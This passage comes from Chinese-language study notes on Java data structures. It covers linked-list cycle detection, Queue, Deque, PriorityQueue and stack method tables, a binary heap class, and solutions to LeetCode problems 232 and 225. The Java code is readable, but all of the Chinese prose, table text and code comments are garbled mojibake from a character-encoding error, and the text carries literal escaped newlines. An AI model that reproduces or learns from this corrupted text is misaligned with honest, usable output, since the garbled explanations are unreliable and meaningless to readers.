`null`ã€‚_\n\nå¦‚æœé“¾è¡¨ä¸­æœ‰æŸä¸ªèŠ‚ç‚¹ï¼Œå¯ä»¥é€šè¿‡è¿ç»­è·Ÿè¸ª `next` æŒ‡é’ˆå†æ¬¡åˆ°è¾¾ï¼Œåˆ™é“¾è¡¨ä¸­å­˜åœ¨ç¯ã€‚ ä¸ºäº†è¡¨ç¤ºç»™å®šé“¾è¡¨ä¸­çš„ç¯ï¼Œè¯„æµ‹ç³»ç»Ÿå†…éƒ¨ä½¿ç”¨æ•´æ•° `pos` æ¥è¡¨ç¤ºé“¾è¡¨å°¾è¿æ¥åˆ°é“¾è¡¨ä¸­çš„ä½ç½®ï¼ˆ**ç´¢å¼•ä» 0 å¼€å§‹**ï¼‰ã€‚å¦‚æœ `pos` æ˜¯ `-1`ï¼Œåˆ™åœ¨è¯¥é“¾è¡¨ä¸­æ²¡æœ‰ç¯ã€‚**æ³¨æ„ï¼š`pos` ä¸ä½œä¸ºå‚æ•°è¿›è¡Œä¼ é€’**ï¼Œä»…ä»…æ˜¯ä¸ºäº†æ ‡è¯†é“¾è¡¨çš„å®é™…æƒ…å†µã€‚\n\n**ä¸å…è®¸ä¿®æ”¹** é“¾è¡¨ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2018/12/07/circularlinkedlist.png)\n\n```\nè¾“å…¥ï¼šhead = [3,2,0,-4], pos = 1\nè¾“å‡ºï¼šè¿”å›ç´¢å¼•ä¸º 1 çš„é“¾è¡¨èŠ‚ç‚¹\nè§£é‡Šï¼šé“¾è¡¨ä¸­æœ‰ä¸€ä¸ªç¯ï¼Œå…¶å°¾éƒ¨è¿æ¥åˆ°ç¬¬äºŒä¸ªèŠ‚ç‚¹ã€‚\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n![](https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test2.png)\n\n```\nè¾“å…¥ï¼šhead = [1,2], pos = 0\nè¾“å‡ºï¼šè¿”å›ç´¢å¼•ä¸º 0 çš„é“¾è¡¨èŠ‚ç‚¹\nè§£é‡Šï¼šé“¾è¡¨ä¸­æœ‰ä¸€ä¸ªç¯ï¼Œå…¶å°¾éƒ¨è¿æ¥åˆ°ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ã€‚\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n![](https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test3.png)\n\n```\nè¾“å…¥ï¼šhead = [1], pos = -1\nè¾“å‡ºï¼šè¿”å› null\nè§£é‡Šï¼šé“¾è¡¨ä¸­æ²¡æœ‰ç¯ã€‚\n```\n\n**è¿›é˜¶ï¼š**ä½ æ˜¯å¦å¯ä»¥ä½¿ç”¨ `O(1)` ç©ºé—´è§£å†³æ­¤é¢˜ï¼Ÿ\n\n------\n\n**æ–¹æ³•ä¸€ï¼šå“ˆå¸Œè¡¨**\n\néå†é“¾è¡¨ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹ï¼Œå¹¶å°†å®ƒè®°å½•ä¸‹æ¥ï¼›ä¸€æ—¦é‡åˆ°äº†æ­¤å‰éå†è¿‡çš„èŠ‚ç‚¹ï¼Œå°±å¯ä»¥åˆ¤å®šé“¾è¡¨ä¸­å­˜åœ¨ç¯ã€‚\n\n```java\npublic class Solution {\n    public ListNode detectCycle(ListNode head) {\n        Set<ListNode> set = new HashSet<>();\n        ListNode temp = head;\n        while(temp != null){\n            if(set.contains(temp)){\n                return temp;\n            }\n            set.add(temp);\n            temp = temp.next;\n        }\n        return null;\n    }\n}\n```\n\næ—¶é—´å¤æ‚åº¦ï¼šO(N)ï¼Œå…¶ä¸­ N ä¸ºé“¾è¡¨ä¸­èŠ‚ç‚¹çš„æ•°ç›®ã€‚æˆ‘ä»¬æ°å¥½éœ€è¦è®¿é—®é“¾è¡¨ä¸­çš„æ¯ä¸€ä¸ªèŠ‚ç‚¹ã€‚\n\nç©ºé—´å¤æ‚åº¦ï¼šO(N)ï¼Œå…¶ä¸­ N ä¸ºé“¾è¡¨ä¸­èŠ‚ç‚¹çš„æ•°ç›®ã€‚æˆ‘ä»¬éœ€è¦å°†é“¾è¡¨ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹éƒ½ä¿å­˜åœ¨å“ˆå¸Œè¡¨å½“ä¸­ã€‚\n\n**æ–¹æ³•äºŒï¼šå¿«æ…¢æŒ‡é’ˆ**\n\n```java\npublic class Solution {\n    public ListNode detectCycle(ListNode head) {\n        ListNode fast = head, slow = head;\n        while(true){\n            if(fast == null || fast.next == null) return null;\n            fast = fast.next.next;\n            slow = slow.next;\n            if(fast == slow) break;\n        }\n        fast = head;\n        while(fast != slow){\n            fast = fast.next;\n            slow = slow.next;\n        }\n        return fast;\n    }\n}\n```\n\n## â‘¢æ ˆ&é˜Ÿåˆ—&å †\n\n### â¶æ™®é€šé˜Ÿåˆ—-Queue\n\n> é˜Ÿåˆ—æ˜¯ä¸€ç§å…ˆè¿›å…ˆå‡ºçš„æ•°æ®ç»“æ„ï¼Œå…ƒç´ ä»åç«¯å…¥é˜Ÿï¼Œç„¶åä»å‰ç«¯å‡ºé˜Ÿã€‚\n\n```java\nQueue<> queue = new LinkedList<>();\n```\n\nå¸¸ç”¨æ–¹æ³•\n\n| å‡½æ•°                    | åŠŸèƒ½                           |\n| ----------------------- | ------------------------------ |\n| add(E e)/**offer(E e)** | å‹å…¥å…ƒç´                        |\n| remove()/**poll()**     | å¼¹å‡ºå…ƒç´                        |\n| element()/**peek()**    | è·å–é˜Ÿå¤´å…ƒç´                    |\n| isEmpty()               | ç”¨äºæ£€æŸ¥æ­¤é˜Ÿåˆ—æ˜¯â€œç©ºâ€è¿˜æ˜¯â€œéç©ºâ€ |\n| size()                  | è·å–é˜Ÿåˆ—é•¿åº¦                   |\n\n###  â·åŒç«¯é˜Ÿåˆ—-Deque\n\nJavaé›†åˆæä¾›äº†æ¥å£`Deque`æ¥å®ç°ä¸€ä¸ªåŒç«¯é˜Ÿåˆ—ï¼Œå®ƒçš„åŠŸèƒ½æ˜¯ï¼š\n\n- æ—¢å¯ä»¥æ·»åŠ åˆ°é˜Ÿå°¾ï¼Œä¹Ÿå¯ä»¥æ·»åŠ åˆ°é˜Ÿé¦–ï¼›\n- æ—¢å¯ä»¥ä»é˜Ÿé¦–è·å–ï¼Œåˆå¯ä»¥ä»é˜Ÿå°¾è·å–ã€‚\n\n**Dequeæœ‰ä¸‰ç§ç”¨é€”**\n\n- æ™®é€šé˜Ÿåˆ—(ä¸€ç«¯è¿›å¦ä¸€ç«¯å‡º):\n\n```java\nDeque<> queue = new LinkedList<>(); \n// ç­‰ä»· \nQueue<> queue = new LinkedList<>();\n```\n\n| **Queueæ–¹æ³•** | **ç­‰æ•ˆDequeæ–¹æ³•** |\n| ------------- | ----------------- |\n| add(e)        | addLast(e)        |\n| offer(e)      | offerLast(e)      |\n| remove()      | removeFirst()     |\n| poll()        | pollFirst()       |\n| element()     | getFirst()        |\n| peek()        | peekFirst()       |\n\n- åŒç«¯é˜Ÿåˆ—(ä¸¤ç«¯éƒ½å¯è¿›å‡º)\n\n```java\n//åº•å±‚ï¼šArrayDequeï¼ˆåŠ¨æ€æ•°ç»„ï¼‰å’Œ LinkedListï¼ˆé“¾è¡¨ï¼‰\nDeque<Integer> deque = new ArrayDeque<>();\nDeque<Integer> deque = new LinkedList<>(); \n```\n\n|          | **ç¬¬ä¸€ä¸ªå…ƒç´  (å¤´éƒ¨)**     | **æœ€åä¸€ä¸ªå…ƒç´  (å°¾éƒ¨)** |\n| -------- | ------------------------- | ----------------------- |\n| **æ’å…¥** | addFirst(e)/offerFirst(e) | addLast(e)/offerLast(e) |\n| **åˆ é™¤** | removeFirst()/pollFirst() | removeLast()/pollLast() |\n| **è·å–** | getFirst()/peekFirst()    | getLast()/peekLast()    |\n\n- å †æ ˆ(å…ˆè¿›åå‡º)\n\n```java\n//åº•å±‚ï¼šArrayDequeï¼ˆåŠ¨æ€æ•°ç»„ï¼‰å’Œ LinkedListï¼ˆé“¾è¡¨ï¼‰\nDeque<Integer> stack = new LinkedList<>(); \nDeque<Integer> stack = new ArrayDeque<>(); //é€Ÿåº¦æ›´å¿«\n// ç­‰ä»·  \nStack<String> stack=new Stack<>();   \n```\n| **å †æ ˆæ–¹æ³•** | **ç­‰æ•ˆDequeæ–¹æ³•** |\n| ------------ | ----------------- |\n| push(e)      | addFirst(e)       |\n| pop()        | removeFirst()     |\n| peek()       | peekFirst()       |\n\nDequeæ‰€æœ‰æ–¹æ³•\n\n| æ–¹æ³•                              | **æè¿°**                                     |\n| --------------------------------- | -------------------------------------------- |\n| **æ·»åŠ åŠŸèƒ½**                      |                                              |\n| **push**(E)                       | å‘é˜Ÿåˆ—å¤´éƒ¨æ’å…¥ä¸€ä¸ªå…ƒç´ ,å¤±è´¥æ—¶æŠ›å‡ºå¼‚å¸¸        |\n| **addFirst**(E)                   | å‘é˜Ÿåˆ—å¤´éƒ¨æ’å…¥ä¸€ä¸ªå…ƒç´ ,å¤±è´¥æ—¶æŠ›å‡ºå¼‚å¸¸        |\n| **addLast**(E)                    | å‘é˜Ÿåˆ—å°¾éƒ¨æ’å…¥ä¸€ä¸ªå…ƒç´ ,å¤±è´¥æ—¶æŠ›å‡ºå¼‚å¸¸        |\n| **offerFirst**(E)                 | å‘é˜Ÿåˆ—å¤´éƒ¨åŠ å…¥ä¸€ä¸ªå…ƒç´ ,å¤±è´¥æ—¶è¿”å›false       |\n| **offerLast**(E)                  | å‘é˜Ÿåˆ—å°¾éƒ¨åŠ å…¥ä¸€ä¸ªå…ƒç´ ,å¤±è´¥æ—¶è¿”å›false       |\n| **è·å–åŠŸèƒ½**                      |                                              |\n| **peek()**                        | è·å–é˜Ÿåˆ—å¤´éƒ¨å…ƒç´ ,é˜Ÿåˆ—ä¸ºç©ºæ—¶æŠ›å‡ºå¼‚å¸¸          |\n| **getFirst**()                    | è·å–é˜Ÿåˆ—å¤´éƒ¨å…ƒç´ ,é˜Ÿåˆ—ä¸ºç©ºæ—¶æŠ›å‡ºå¼‚å¸¸          |\n| **getLast**()                     | è·å–é˜Ÿåˆ—å°¾éƒ¨å…ƒç´ ,é˜Ÿåˆ—ä¸ºç©ºæ—¶æŠ›å‡ºå¼‚å¸¸          |\n| **peekFirst**()                   | è·å–é˜Ÿåˆ—å¤´éƒ¨å…ƒç´ ,é˜Ÿåˆ—ä¸ºç©ºæ—¶è¿”å›null          |\n| **peekLast**()                    | è·å–é˜Ÿåˆ—å°¾éƒ¨å…ƒç´ ,é˜Ÿåˆ—ä¸ºç©ºæ—¶è¿”å›null          |\n| **åˆ é™¤åŠŸèƒ½**                      |                                              |\n| **removeFirstOccurrence**(Object) | åˆ é™¤ç¬¬ä¸€æ¬¡å‡ºç°çš„æŒ‡å®šå…ƒç´ ,ä¸å­˜åœ¨æ—¶è¿”å›false   |\n| **removeLastOccurrence**(Object)  | åˆ é™¤æœ€åä¸€æ¬¡å‡ºç°çš„æŒ‡å®šå…ƒç´ ,ä¸å­˜åœ¨æ—¶è¿”å›false |\n| **å¼¹å‡ºåŠŸèƒ½**                      |                                              |\n| **pop**()                         | å¼¹å‡ºé˜Ÿåˆ—å¤´éƒ¨å…ƒç´ ,é˜Ÿåˆ—ä¸ºç©ºæ—¶æŠ›å‡ºå¼‚å¸¸          |\n| **removeFirst**()                 | å¼¹å‡ºé˜Ÿåˆ—å¤´éƒ¨å…ƒç´ ,é˜Ÿåˆ—ä¸ºç©ºæ—¶æŠ›å‡ºå¼‚å¸¸          |\n| **removeLast**()                  | å¼¹å‡ºé˜Ÿåˆ—å°¾éƒ¨å…ƒç´ ,é˜Ÿåˆ—ä¸ºç©ºæ—¶æŠ›å‡ºå¼‚å¸¸          |\n| **pollFirst**()                   | å¼¹å‡ºé˜Ÿåˆ—å¤´éƒ¨å…ƒç´ ,é˜Ÿåˆ—ä¸ºç©ºæ—¶è¿”å›null          |\n| **pollLast**()                    | å¼¹å‡ºé˜Ÿåˆ—å°¾éƒ¨å…ƒç´ ,é˜Ÿåˆ—ä¸ºç©ºæ—¶è¿”å›null          |\n\n### â¸ä¼˜å…ˆé˜Ÿåˆ—-PriorityQueue\n\n> ä¼˜å…ˆçº§é˜Ÿåˆ—å…¶å®**å°±æ˜¯ä¸€ä¸ªæŠ«ç€é˜Ÿåˆ—å¤–è¡£çš„å †**ï¼Œå› ä¸ºä¼˜å…ˆé˜Ÿåˆ—å¯¹å¤–æ¥å£åªæ˜¯ä»é˜Ÿå¤´å–å…ƒç´ ï¼Œä»é˜Ÿå°¾æ·»åŠ å…ƒç´ ï¼Œå†æ— å…¶ä»–å–å…ƒç´ çš„æ–¹å¼ï¼Œçœ‹èµ·æ¥å°±æ˜¯ä¸€ä¸ªé˜Ÿåˆ—ã€‚\n>\n> PriorityQueue æ˜¯å…·æœ‰ä¼˜å…ˆçº§åˆ«çš„é˜Ÿåˆ—ï¼Œä¼˜å…ˆçº§é˜Ÿåˆ—çš„å…ƒç´ æŒ‰ç…§å®ƒä»¬çš„è‡ªç„¶é¡ºåºæ’åºï¼Œæˆ–è€…ç”±é˜Ÿåˆ—æ„é€ æ—¶æä¾›çš„ Comparator è¿›è¡Œæ’åºï¼Œè¿™å–å†³äºä½¿ç”¨çš„æ˜¯å“ªä¸ªæ„é€ å‡½æ•°\n\n| æ„é€ å‡½æ•°                                          | æè¿°                                                         |\n| ------------------------------------------------- | ------------------------------------------------------------ |\n| PriorityQueue()                                   | ä½¿ç”¨é»˜è®¤çš„å®¹é‡ï¼ˆ11ï¼‰åˆ›å»ºä¸€ä¸ªä¼˜é˜Ÿåˆ—ï¼Œå…ƒç´ çš„é¡ºåºè§„åˆ™é‡‡ç”¨çš„æ˜¯è‡ªç„¶é¡ºåº |\n| PriorityQueue(int initialCapacity)                | ä½¿ç”¨é»˜è®¤æŒ‡å®šçš„å®¹é‡åˆ›å»ºä¸€ä¸ªä¼˜é˜Ÿåˆ—ï¼Œå…ƒç´ çš„é¡ºåºè§„åˆ™é‡‡ç”¨çš„æ˜¯è‡ªç„¶é¡ºåº |\n| PriorityQueue(Comparator\\<? super E\\> comparator) | ä½¿ç”¨é»˜è®¤çš„å®¹é‡é˜Ÿåˆ—ï¼Œå…ƒç´ çš„é¡ºåºè§„åˆ™é‡‡ç”¨çš„æ˜¯ comparator        |\n\n```java\n//é»˜è®¤æŒ‰è‡ªç„¶é¡ºåºï¼ˆå‡åºï¼‰æ£€ç´¢çš„\nPriorityQueue<Integer> numbers = new PriorityQueue<>();\n\n//ä½¿ç”¨Comparatoræ¥å£è‡ªå®šä¹‰æ­¤é¡ºåº\nPriorityQueue<int[]> queue = new PriorityQueue<int[]>(new Comparator<int[]>() {\n  public int compare(int[] m, int[] n) {\n    return m[1] - n[1];\n  }\n});\n```\n\n### â¹æ ˆ-Stack/Deque\n\n> æ ˆæ˜¯ä¸€ç§åè¿›å…ˆå‡ºçš„æ•°æ®ç»“æ„ï¼Œå…ƒç´ ä»é¡¶ç«¯å…¥æ ˆï¼Œç„¶åä»é¡¶ç«¯å‡ºæ ˆã€‚\n>\n> æ³¨æ„ï¼šJava å †æ ˆ Stack ç±»å·²ç»è¿‡æ—¶ï¼ŒJava å®˜æ–¹æ¨èä½¿ç”¨ Deque æ›¿ä»£ Stack ä½¿ç”¨ã€‚Deque å †æ ˆæ“ä½œæ–¹æ³•ï¼špush()ã€pop()ã€peek()ã€‚\n\n**åˆ›å»ºæ ˆ**\n\n```java\n//æ–¹æ³•ä¸€ï¼Œå¼ƒç”¨\nStack<E> stack=new Stack<>();\nStack<String> stack=new Stack<>();\n\n//æ–¹æ³•äºŒï¼šæ¨èä½¿ç”¨\n//åº•å±‚ï¼šArrayDequeï¼ˆåŠ¨æ€æ•°ç»„ï¼‰å’Œ LinkedListï¼ˆé“¾è¡¨ï¼‰\nDeque stack = new ArrayDeque<String>();\nDeque stack = new LinkedList<String>();\n\nstack.push(\"a\");\nstack.pop();\nstack.push(\"b\");\nSystem.out.println(stack);\n```\n\n**å¸¸ç”¨æ–¹æ³•**\n\n| å‡½æ•°             | åŠŸèƒ½                                |\n| ---------------- | ----------------------------------- |\n| push(T t)        | å‹æ ˆï¼ˆå‘æ ˆé¡¶æ”¾å…¥å…ƒç´ ï¼‰              |\n| pop()            | å‡ºæ ˆï¼ˆæ‹¿å‡ºæ ˆé¡¶å…ƒç´ ï¼Œå¹¶å¾—åˆ°å®ƒçš„å€¼ï¼‰  |\n| peek()           | å°†æ ˆé¡¶å…ƒç´ è¿”å›ï¼Œä½†æ˜¯ä¸ä»æ ˆä¸­ç§»é™¤å®ƒ  |\n| search(Object o) | è¿”å›å¯¹è±¡åœ¨æ­¤å †æ ˆä¸Šçš„ä»1å¼€å§‹çš„ä½ç½®ã€‚ |\n| isEmpty()        | åˆ¤æ–­æ ˆæ˜¯å¦ä¸ºç©º                      |\n| size()           | è·å–æ ˆé•¿åº¦                          |\n\n### âºå †-Heap\n\n> å †é€šå¸¸å¯ä»¥è¢«çœ‹åšæ˜¯**ä¸€æ£µå®Œå…¨äºŒå‰æ ‘çš„æ•°ç»„å¯¹è±¡**ã€‚\n\n**å †çš„ç‰¹æ€§ï¼š**\n\n- 1.**å †æ˜¯å®Œå…¨äºŒå‰æ ‘**ï¼Œé™¤äº†æ ‘çš„æœ€åä¸€å±‚ç»“ç‚¹ä¸éœ€è¦æ˜¯æ»¡çš„ï¼Œå…¶å®ƒçš„æ¯ä¸€å±‚ä»å·¦åˆ°å³éƒ½æ˜¯æ»¡çš„ï¼Œå¦‚æœæœ€åä¸€å±‚ç»“ç‚¹ä¸æ˜¯æ»¡çš„ï¼Œé‚£ä¹ˆè¦æ±‚å·¦æ»¡å³ä¸æ»¡ã€‚\n\n- 2.**å †é€šå¸¸ç”¨æ•°ç»„æ¥å®ç°**ã€‚å°†äºŒå‰æ ‘çš„ç»“ç‚¹æŒ‰ç…§å±‚çº§é¡ºåºæ”¾å…¥æ•°ç»„ä¸­ï¼Œæ ¹ç»“ç‚¹åœ¨ä½ç½®1ï¼Œå®ƒçš„å­ç»“ç‚¹åœ¨ä½ç½®2å’Œ3ï¼Œè€Œå­ç»“ç‚¹çš„å­ç»“ç‚¹åˆ™åˆ†åˆ«åœ¨ä½ç½®4,5,6å’Œ7ï¼Œä»¥æ­¤ç±»æ¨ã€‚(0è¢«åºŸå¼ƒ)\n\n<img src=\"https://img.jwt1399.top/img/202211071641699.png\" style=\"zoom: 50%;\" />\n\nå¦‚æœä¸€ä¸ªç»“ç‚¹çš„ä½ç½®ä¸º`k`ï¼Œåˆ™å®ƒçš„çˆ¶ç»“ç‚¹çš„ä½ç½®ä¸º`[k/2]`ï¼Œè€Œå®ƒçš„ä¸¤ä¸ªå­ç»“ç‚¹çš„ä½ç½®åˆ™åˆ†åˆ«ä¸º`2k`å’Œ`2k+1`ã€‚\n\nè¿™æ ·ï¼Œåœ¨ä¸ä½¿ç”¨æŒ‡é’ˆçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡è®¡ç®—æ•°ç»„çš„ç´¢å¼•åœ¨æ ‘ä¸­ä¸Šä¸‹ç§»åŠ¨ï¼šä»a[k]å‘ä¸Šä¸€å±‚ï¼Œå°±ä»¤kç­‰äºk/2,å‘ä¸‹ä¸€å±‚å°±ä»¤kç­‰äº2kæˆ–2k+1ã€‚\n\n- 3.**æ¯ä¸ªç»“ç‚¹éƒ½å¤§äºç­‰äºå®ƒçš„ä¸¤ä¸ªå­ç»“ç‚¹**ã€‚è¿™é‡Œè¦æ³¨æ„å †ä¸­ä»…ä»…è§„å®šäº†æ¯ä¸ªç»“ç‚¹å¤§äºç­‰äºå®ƒçš„ä¸¤ä¸ªå­ç»“ç‚¹ï¼Œä½†è¿™ä¸¤ä¸ªå­ç»“ç‚¹çš„é¡ºåºå¹¶æ²¡æœ‰åšè§„å®šï¼Œè·Ÿæˆ‘ä»¬ä¹‹å‰å­¦ä¹ çš„äºŒå‰æŸ¥æ‰¾æ ‘æ˜¯æœ‰åŒºåˆ«çš„ã€‚\n\n**å †çš„APIè®¾è®¡**\n\n![](../images/æ•°æ®ç»“æ„ä¸ç®—æ³•/image-20221107164431979.png)\n\n```java\npublic class Heap<T extends Comparable<T>> {\n    //å­˜å‚¨å †ä¸­çš„å…ƒç´ \n    private T[] items;\n    //è®°å½•å †ä¸­å…ƒç´ çš„ä¸ªæ•°\n    private int N;\n\n    public Heap(int capacity) {\n        this.items = (T[]) new Comparable[capacity + 1];\n        this.N = 0;\n    }\n\n    //åˆ¤æ–­å †ä¸­ç´¢å¼•iå¤„çš„å…ƒç´ æ˜¯å¦å°äºç´¢å¼•jå¤„çš„å…ƒç´ \n    private boolean less(int i, int j) {\n        return items[i].compareTo(items[j]) < 0;\n    }\n\n    //äº¤æ¢å †ä¸­iç´¢å¼•å’Œjç´¢å¼•å¤„çš„å€¼\n    private void exch(int i, int j) {\n        T temp = items[i];\n        items[i] = items[j];\n        items[j] = temp;\n    }\n\n    //å¾€å †ä¸­æ’å…¥ä¸€ä¸ªå…ƒç´ \n    public void insert(T t) {\n        items[++N] = t;\n        swim(N);\n    }\n\n    //ä½¿ç”¨ä¸Šæµ®ç®—æ³•ï¼Œä½¿ç´¢å¼•kå¤„çš„å…ƒç´ èƒ½åœ¨å †ä¸­å¤„äºä¸€ä¸ªæ­£ç¡®çš„ä½ç½®\n    private void swim(int k) {\n        //é€šè¿‡å¾ªç¯ï¼Œä¸æ–­çš„æ¯”è¾ƒå½“å‰ç»“ç‚¹çš„å€¼å’Œå…¶çˆ¶ç»“ç‚¹çš„å€¼ï¼Œå¦‚æœå‘ç°çˆ¶ç»“ç‚¹çš„å€¼æ¯”å½“å‰ç»“ç‚¹çš„å€¼å°ï¼Œåˆ™äº¤æ¢ä½ç½®\n        while (k > 1) {\n            //æ¯”è¾ƒå½“å‰ç»“ç‚¹å’Œå…¶çˆ¶ç»“ç‚¹\n            if (less(k / 2, k)) {\n                exch(k / 2, k);\n            }\n            k = k / 2;\n        }\n    }\n\n    //åˆ é™¤å †ä¸­æœ€å¤§çš„å…ƒç´ ,å¹¶è¿”å›è¿™ä¸ªæœ€å¤§å…ƒç´ \n    public T delMax() {\n        T max = items[1];\n        //äº¤æ¢ç´¢å¼•1å¤„çš„å…ƒç´ å’Œæœ€å¤§ç´¢å¼•å¤„çš„å…ƒç´ ï¼Œè®©å®Œå…¨äºŒå‰æ ‘ä¸­æœ€å³ä¾§çš„å…ƒç´ å˜ä¸ºä¸´æ—¶æ ¹ç»“ç‚¹\n        exch(1, N);\n        //æœ€å¤§ç´¢å¼•å¤„çš„å…ƒç´ åˆ é™¤æ‰\n        items[N] = null;\n        //å…ƒç´ ä¸ªæ•°-1\n        N--;\n        //é€šè¿‡ä¸‹æ²‰è°ƒæ•´å †ï¼Œè®©å †é‡æ–°æœ‰åº\n        sink(1);\n        return max;\n    }\n\n    //ä½¿ç”¨ä¸‹æ²‰ç®—æ³•ï¼Œä½¿ç´¢å¼•kå¤„çš„å…ƒç´ èƒ½åœ¨å †ä¸­å¤„äºä¸€ä¸ªæ­£ç¡®çš„ä½ç½®\n    private void sink(int k) {\n        //å¾ªç¯å¯¹æ¯”kç»“ç‚¹å’Œå…¶å·¦å­ç»“ç‚¹2kä»¥åŠå³å­ç»“ç‚¹2k+1å¤„ä¸­çš„è¾ƒå¤§å€¼çš„å…ƒç´ å¤§å°ï¼Œå¦‚æœå½“å‰ç»“ç‚¹å°ï¼Œåˆ™éœ€è¦äº¤æ¢ä½ç½®\n        while (2 * k <= N) {\n            //è·å–å½“å‰ç»“ç‚¹çš„å­ç»“ç‚¹ä¸­çš„è¾ƒå¤§ç»“ç‚¹\n            int max;//è®°å½•è¾ƒå¤§ç»“ç‚¹æ‰€åœ¨çš„ç´¢å¼•\n            if (2 * k + 1 <= N) {\n                if (less(2 * k, 2 * k + 1)) {\n                    max = 2 * k + 1;\n                } else {\n                    max = 2 * k;\n                }\n            } else {\n                max = 2 * k;\n            }\n            //æ¯”è¾ƒå½“å‰ç»“ç‚¹å’Œè¾ƒå¤§ç»“ç‚¹çš„å€¼\n            if (!less(k, max)) {\n                break;\n            }\n            //äº¤æ¢kç´¢å¼•å¤„çš„å€¼å’Œmaxç´¢å¼•å¤„çš„å€¼\n            exch(k, max);\n            //å˜æ¢kçš„å€¼\n            k = max;\n        }\n    }\n\n    public static void main(String[] args) {\n        Heap<String> heap = new Heap<String>(20);\n        heap.insert(\"A\");\n        heap.insert(\"B\");\n        heap.insert(\"C\");\n        heap.insert(\"D\");\n        heap.insert(\"E\");\n        heap.insert(\"F\");\n        heap.insert(\"G\");\n\n        String del;\n        //å¾ªç¯åˆ é™¤\n        while ((del = heap.delMax()) != null) {\n            System.out.print(del + \",\");\n        }\n    }\n}\n```\n\n\n\n### â»LeetCodeçœŸé¢˜\n\n#### [232. ç”¨æ ˆå®ç°é˜Ÿåˆ— ](https://leetcode.cn/problems/implement-queue-using-stacks/)\n\nè¯·ä½ ä»…ä½¿ç”¨ä¸¤ä¸ªæ ˆå®ç°å…ˆå…¥å…ˆå‡ºé˜Ÿåˆ—ã€‚é˜Ÿåˆ—åº”å½“æ”¯æŒä¸€èˆ¬é˜Ÿåˆ—æ”¯æŒçš„æ‰€æœ‰æ“ä½œï¼ˆ`push`ã€`pop`ã€`peek`ã€`empty`ï¼‰ï¼š\n\nå®ç° `MyQueue` ç±»ï¼š\n\n-   `void push(int x)` å°†å…ƒç´  x æ¨åˆ°é˜Ÿåˆ—çš„æœ«å°¾\n-   `int pop()` ä»é˜Ÿåˆ—çš„å¼€å¤´ç§»é™¤å¹¶è¿”å›å…ƒç´ \n-   `int peek()` è¿”å›é˜Ÿåˆ—å¼€å¤´çš„å…ƒç´ \n-   `boolean empty()` å¦‚æœé˜Ÿåˆ—ä¸ºç©ºï¼Œè¿”å› `true` ï¼›å¦åˆ™ï¼Œè¿”å› `false`\n\n**è¯´æ˜ï¼š**\n\n-   ä½  **åªèƒ½** ä½¿ç”¨æ ‡å‡†çš„æ ˆæ“ä½œ â€”â€” ä¹Ÿå°±æ˜¯åªæœ‰ `push to top`, `peek/pop from top`, `size`, å’Œ `is empty` æ“ä½œæ˜¯åˆæ³•çš„ã€‚\n-   ä½ æ‰€ä½¿ç”¨çš„è¯­è¨€ä¹Ÿè®¸ä¸æ”¯æŒæ ˆã€‚ä½ å¯ä»¥ä½¿ç”¨ list æˆ–è€… dequeï¼ˆåŒç«¯é˜Ÿåˆ—ï¼‰æ¥æ¨¡æ‹Ÿä¸€ä¸ªæ ˆï¼Œåªè¦æ˜¯æ ‡å‡†çš„æ ˆæ“ä½œå³å¯ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```\nè¾“å…¥ï¼š\n[\"MyQueue\", \"push\", \"push\", \"peek\", \"pop\", \"empty\"]\n[[], [1], [2], [], [], []]\nè¾“å‡ºï¼š\n[null, null, null, 1, 1, false]\n\nè§£é‡Šï¼š\nMyQueue myQueue = new MyQueue();\nmyQueue.push(1); // queue is: [1]\nmyQueue.push(2); // queue is: [1, 2] (leftmost is front of the queue)\nmyQueue.peek(); // return 1\nmyQueue.pop(); // return 1, queue is [2]\nmyQueue.empty(); // return false\n```\n\n------\n\n```java\nclass MyQueue {\n\n    Deque<Integer> inStack;\n    Deque<Integer> outStack;\n\n    public MyQueue() {\n         inStack = new ArrayDeque<>();   // è´Ÿè´£è¿›æ ˆ\n         outStack = new ArrayDeque<>(); // è´Ÿè´£å‡ºæ ˆ\n    }\n    \n    public void push(int x) {\n        inStack.push(x);\n    }\n    \n    public int pop() {\n        // è‹¥è¾“å‡ºæ ˆä¸ºç©ºåˆ™å°†è¾“å…¥æ ˆçš„å…¨éƒ¨æ•°æ®ä¾æ¬¡å¼¹å‡ºå¹¶å‹å…¥è¾“å‡ºæ ˆ\n        if(outStack.isEmpty()){ \n            while(!inStack.isEmpty()){\n                outStack.push(inStack.pop());\n            }\n        }\n        // å¼¹å‡ºè¾“å‡ºæ ˆæ ˆé¡¶å…ƒç´ ï¼ˆè¾“å‡ºæ ˆä¸ä¸ºç©ºç›´æ¥å¼¹å‡ºï¼Œä¸ºç©ºæ—¶æ‰§è¡Œä¸Šé¢æ“ä½œï¼‰\n        return outStack.pop();\n    }\n    \n    public int peek() {\n        // è‹¥è¾“å‡ºæ ˆä¸ºç©ºåˆ™å°†è¾“å…¥æ ˆçš„å…¨éƒ¨æ•°æ®ä¾æ¬¡å¼¹å‡ºå¹¶å‹å…¥è¾“å‡ºæ ˆ\n        if(outStack.isEmpty()){ \n            while(!inStack.isEmpty()){\n                outStack.push(inStack.pop());\n            }\n        }\n        // è¿”å›æ ˆé¡¶å…ƒç´ \n        return outStack.peek();\n\n    }\n    \n    public boolean empty() {\n        return inStack.isEmpty() && outStack.isEmpty();\n    }\n}\n```\n\n#### [225. ç”¨é˜Ÿåˆ—å®ç°æ ˆ](https://leetcode.cn/problems/implement-stack-using-queues/)\n\nè¯·ä½ ä»…ä½¿ç”¨ä¸¤ä¸ªé˜Ÿåˆ—å®ç°ä¸€ä¸ªåå…¥å…ˆå‡ºï¼ˆLIFOï¼‰çš„æ ˆï¼Œå¹¶æ”¯æŒæ™®é€šæ ˆçš„å…¨éƒ¨å››ç§æ“ä½œï¼ˆ`push`ã€`top`ã€`pop` å’Œ `empty`ï¼‰ã€‚\n\nå®ç° `MyStack` ç±»ï¼š\n\n-   `void push(int x)` å°†å…ƒç´  x å‹å…¥æ ˆé¡¶ã€‚\n-   `int pop()` 